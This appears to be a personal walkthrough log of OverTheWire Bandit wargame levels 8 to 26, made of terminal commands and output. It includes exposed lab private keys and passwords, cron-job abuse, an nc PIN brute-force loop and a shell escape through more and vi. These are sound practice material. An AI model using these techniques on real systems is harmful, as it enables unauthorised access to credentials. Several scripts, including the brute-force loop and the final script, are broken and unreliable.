bandit8@melinda:~$ cat data.txt | sort | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR


bandit9@melinda:~$ strings -n 8 data.txt 
6yHYKqt\T8sb
I========== the6
IsZnMs~	
========== password
========== ism
BayyIGxC
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

bandit10@melinda:~$ base64 -d data.txt
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

bandit11@melinda:~$ cat data.txt | tr a-zA-Z n-za-mN-ZA-M
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu


bandit12@melinda:/tmp/karl$ xxd -r data.txt data.gz
[do a bunch of decompressions]
bandit12@melinda:/tmp/karl$ more data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

bandit13@melinda:~$ ls
sshkey.private
bandit13@melinda:~$ more sshkey.private 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----


$ chmod 600 bandit.key 
$ ssh -i bandit.key bandit14@bandit.labs.overthewire.org
[SNIP]
  For questions or comments, contact us through IRC on
  irc.overthewire.org.


bandit14@melinda:/etc/bandit_pass$ ls
bandit0   bandit11  bandit14  bandit17  bandit2   bandit22  bandit25  bandit4  bandit7
bandit1   bandit12  bandit15  bandit18  bandit20  bandit23  bandit26  bandit5  bandit8
bandit10  bandit13  bandit16  bandit19  bandit21  bandit24  bandit3   bandit6  bandit9
bandit14@melinda:/etc/bandit_pass$ more bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

bandit14@melinda:/etc/bandit_pass$ telnet localhost 30000
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

Connection closed by foreign host.



$ ssh bandit15@bandit.labs.overthewire.org

This is the OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit15@melinda:~$ more /etc/bandit_pass/bandit15
BfMYroe26WYalil77FoDi9qh59eK5xNr

bandit15@melinda:~$ openssl s_client -connect localhost:30001 -ign_eof
CONNECTED(00000003)
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
---
Certificate chain
 0 s:/CN=li190-250.members.linode.com
   i:/CN=li190-250.members.linode.com
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC3jCCAcagAwIBAgIJAI5QiWZw4YHbMA0GCSqGSIb3DQEBCwUAMCcxJTAjBgNV
BAMTHGxpMTkwLTI1MC5tZW1iZXJzLmxpbm9kZS5jb20wHhcNMTQxMTE0MTAyODA0
WhcNMjQxMTExMTAyODA0WjAnMSUwIwYDVQQDExxsaTE5MC0yNTAubWVtYmVycy5s
aW5vZGUuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsKmy9o5z
WU+1EH7Z3bB5TGQA+16zXDcEJy6tZWZ8CDrRyQXiahendp45BWUc/ZuLDo0+B3Wt
ZXjofmLw/F4fmR+8X1s1fQZX2dFt920qEm7LxqzWd0c7FdHiBwwRrwhkk+3cQpOB
TTGdLWEgpdmwwNZDTUdsDLzjDczPnju6T6p6ArTECztPbmTjfY4QIRtC6capL1Z+
yPJSQVAuAMEX1wTDWTGdm0VV7oW4F5cGZutf6QAP51jdhSyZuGilIPHbnj0l6Qc7
a7+OtEsEGi31aJ8KpRf7LNZ7DXCuoB3Hf75Pd6VjDgoOIagcH0NYqa75gEjBkGzs
ktLWykT7ag7fKwIDAQABow0wCzAJBgNVHRMEAjAAMA0GCSqGSIb3DQEBCwUAA4IB
AQCaZdUNAj8WDEKWdoU3LNXUBJlTJwiWBrh550PbHSQORcCz2K0kiMei1A4ojK2N
dMHFGAqAeUEaxtz92p2BoFpZasAtdSa3u63tBckFhfUolIS1TC7Cj51y19ysTeep
fGPFpuPCVqVPsruei8Z/iqn3bFIhQQdmumeePZQdPMwZSWHNVYC5XODd7PvNDrDu
5MZJjkz4+6LbwwAvyew62meFN2QEsYbK2Brtbhze+IjE27FGWlSw4K3jlwa409MD
MTf4JU41ELaYY8G/LSNDJsBVhhkHzvXR9iCbXxNz3IL0dQDNj7h4LKhBy0q7hvqg
kDzwlmBO4WKSmCAuky44cXmd
-----END CERTIFICATE-----
subject=/CN=li190-250.members.linode.com
issuer=/CN=li190-250.members.linode.com
---
No client certificate CA names sent
---
SSL handshake has read 1714 bytes and written 637 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : DHE-RSA-AES256-SHA
    Session-ID: D11EA3F499719E04497C5101DBC012FD38CE99C9EF86565D8445A19E311DE0B9
    Session-ID-ctx: 
    Master-Key: FBD82246947CC1AB88624B158C66E920BA6A0375E3EFBC7E59322B84FA2C1D91159FA89736453663A8CD260EA386C54C
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1452796856
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0

************************

bandit16@melinda:~$ openssl s_client -connect localhost:31790 -ign_eof
CONNECTED(00000003)
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
---
Certificate chain
 0 s:/CN=li190-250.members.linode.com
   i:/CN=li190-250.members.linode.com
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC3jCCAcagAwIBAgIJAI5QiWZw4YHbMA0GCSqGSIb3DQEBCwUAMCcxJTAjBgNV
BAMTHGxpMTkwLTI1MC5tZW1iZXJzLmxpbm9kZS5jb20wHhcNMTQxMTE0MTAyODA0
WhcNMjQxMTExMTAyODA0WjAnMSUwIwYDVQQDExxsaTE5MC0yNTAubWVtYmVycy5s
aW5vZGUuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsKmy9o5z
WU+1EH7Z3bB5TGQA+16zXDcEJy6tZWZ8CDrRyQXiahendp45BWUc/ZuLDo0+B3Wt
ZXjofmLw/F4fmR+8X1s1fQZX2dFt920qEm7LxqzWd0c7FdHiBwwRrwhkk+3cQpOB
TTGdLWEgpdmwwNZDTUdsDLzjDczPnju6T6p6ArTECztPbmTjfY4QIRtC6capL1Z+
yPJSQVAuAMEX1wTDWTGdm0VV7oW4F5cGZutf6QAP51jdhSyZuGilIPHbnj0l6Qc7
a7+OtEsEGi31aJ8KpRf7LNZ7DXCuoB3Hf75Pd6VjDgoOIagcH0NYqa75gEjBkGzs
ktLWykT7ag7fKwIDAQABow0wCzAJBgNVHRMEAjAAMA0GCSqGSIb3DQEBCwUAA4IB
AQCaZdUNAj8WDEKWdoU3LNXUBJlTJwiWBrh550PbHSQORcCz2K0kiMei1A4ojK2N
dMHFGAqAeUEaxtz92p2BoFpZasAtdSa3u63tBckFhfUolIS1TC7Cj51y19ysTeep
fGPFpuPCVqVPsruei8Z/iqn3bFIhQQdmumeePZQdPMwZSWHNVYC5XODd7PvNDrDu
5MZJjkz4+6LbwwAvyew62meFN2QEsYbK2Brtbhze+IjE27FGWlSw4K3jlwa409MD
MTf4JU41ELaYY8G/LSNDJsBVhhkHzvXR9iCbXxNz3IL0dQDNj7h4LKhBy0q7hvqg
kDzwlmBO4WKSmCAuky44cXmd
-----END CERTIFICATE-----
subject=/CN=li190-250.members.linode.com
issuer=/CN=li190-250.members.linode.com
---
No client certificate CA names sent
---
SSL handshake has read 1714 bytes and written 637 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : DHE-RSA-AES256-SHA
    Session-ID: C44B0F1F9C66926A748E9CDD7950CA84C4DCA467A43C54DEA5CC9AAFA6B6F2E6
    Session-ID-ctx: 
    Master-Key: 082BD6D0668A2B279CFC3CE1979C72F8294C8D97A484493478B2BC51B0351BD4F69D65FE6F63D110EB74286868FCD844
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1452800391
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0


********************

bandit17@melinda:~$ ls
passwords.new  passwords.old
bandit17@melinda:~$ diff passwords.new passwords.old
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR

*********************

$ scp bandit18@bandit.labs.overthewire.org:readme .

This is the OverTheWire game server. More information on http://www.overthewire.org/wargames

Please note that wargame usernames are no longer level<X>, but wargamename<X>
e.g. vortex4, semtex2, ...

Note: at this moment, blacksun is not available.

bandit18@bandit.labs.overthewire.org's password: 
readme                                                                   100%   33     0.0KB/s   00:00    
$ ls
bandit.key		bandit17.key		overthewire_bandit.txt	readme
$ vi readme 
$ more readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

**********************

bandit19@melinda:~$ ./bandit20-do more /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j

**********************
First.. log in to one session on bandit20 and set up a listener, when the program runs on the other side, enter the current password to get the next one for 21

bandit20@melinda:~$ nc -l 12345
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@melinda:~$ 

Then run the program
bandit20@melinda:~$ ./suconnect 12345
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password

****************************************

bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

***********************************

bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

********************************

bandit22@melinda:~$ ls -al
total 20
drwxr-xr-x   2 root root 4096 Nov 14  2014 .
drwxr-xr-x 167 root root 4096 Jul  9  2015 ..
-rw-r--r--   1 root root  220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root root 3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root root  675 Apr  9  2014 .profile
bandit22@melinda:~$ ls /etc/cron.d/    
behemoth4_cleanup  cronjob_bandit24       melinda-stats          natas25_cleanup~  semtex0-32   sysstat
cron-apt           cronjob_bandit24_root  natas-session-toucher  natas26_cleanup   semtex0-64   vortex0
cronjob_bandit22   leviathan5_cleanup     natas-stats            natas27_cleanup   semtex0-ppc  vortex20
cronjob_bandit23   manpage3_resetpw_job   natas25_cleanup        php5              semtex5
bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@melinda:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

****************************

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done

so..
this is merely executing a script as bandit24

so, I put a script in the dir to cat the contents of /etc/bandit_pass/bandit24 to a file in /tmp/pass.txt

#!/bin/bash

cat /etc/bandit_pass > /tmp/pass.txt

the result is

bandit23@melinda:/etc/bandit_pass$ cat /tmp/pass.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

**************************

#!/bin/bash

for i in $(0000..9999)
do
    echo $i
      echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'  $i | nc localhost 30002
done


bandit24@melinda:~$ cat /tmp/bandit25results | grep -A 2 -B 2 Correct!
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG


****************

bandit25@melinda:/usr/bin$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@melinda:/usr/bin$ more showtext
#!/bin/sh

more ~/text.txt
exit 0

get into interactive mode by making the terminal small.  Once you see the -MORE-, then type “v”.  That will bring up vi.  from there you can use the command “:r /etc/bandit_pass/bandit26” to view the file to get to the next level

  _                     _ _ _   ___   __
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/


*************************




!#/bin/bash

folders=?~/inhere/*

for folder in $folders
do
        for file in $folder
        do
                if [ -f $file ]
                then
                        cat $ file
                fi
        done
done





